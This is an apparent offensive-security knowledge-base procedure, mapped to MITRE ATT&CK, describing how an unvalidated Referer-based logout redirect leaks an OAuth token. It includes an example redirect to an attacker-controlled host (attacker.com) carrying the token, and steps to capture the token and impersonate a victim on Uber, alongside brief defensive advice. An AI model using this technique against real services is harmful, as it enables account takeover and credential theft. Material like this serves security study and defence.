---
tags:
  - token-leak
  - referer
type: procedure
tools: []
tactics:
  - '[[Lateral Movement]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Use Alternate Authentication Material]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 90c8f4f3-85ef-45e4-8365-72c7c077d77d
created_at: '2025-12-11T06:10:15.760Z'
updated_at: '2025-12-11T06:10:15.760Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0008]]'
mitre_techniques:
  - '[[T1550]]'
---
# Leak Token via Referer-Based Redirect

## Summary

This procedure exploits the logout endpoint's Referer-based redirect to leak the OAuth token to an attacker-controlled site.

## Description

The logout endpoint redirects to the URL in the Referer header without validation, appending the OAuth token. This allows exfiltration to an external site, enabling account takeover.

## Requirements

1. Control over Referer header in the request to logout
2. Attacker-controlled site to receive the leaked token
3. Valid token from authorization flow

## Defense

Defensive measures and detection strategies:

- Never base redirects on untrusted headers like Referer
- Use secure token handling and avoid appending to redirects

## Objectives

1. Exfiltrate OAuth token
2. Achieve account takeover
3. Validate full chain success

## Instructions

### Step 1: Trigger Referer Redirect

**Context**: Logout endpoint processes the request and redirects based on Referer.

With Referer set to https://attacker.com, it redirects to:

```
https://attacker.com?token=LEAKED_OAUTH_TOKEN
```

> Token is appended in query string.

### Step 2: Capture Leaked Token

**Context**: Receive and use the token on attacker site.

Log the incoming request on attacker.com to extract the token.

> Use the token to impersonate the victim on Uber.

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement]]

### Techniques

- [[Use Alternate Authentication Material]]

### Sub-Techniques



## Commands Used



## Tools Used



## Tags

- [[token-leak]]
- [[referer]]
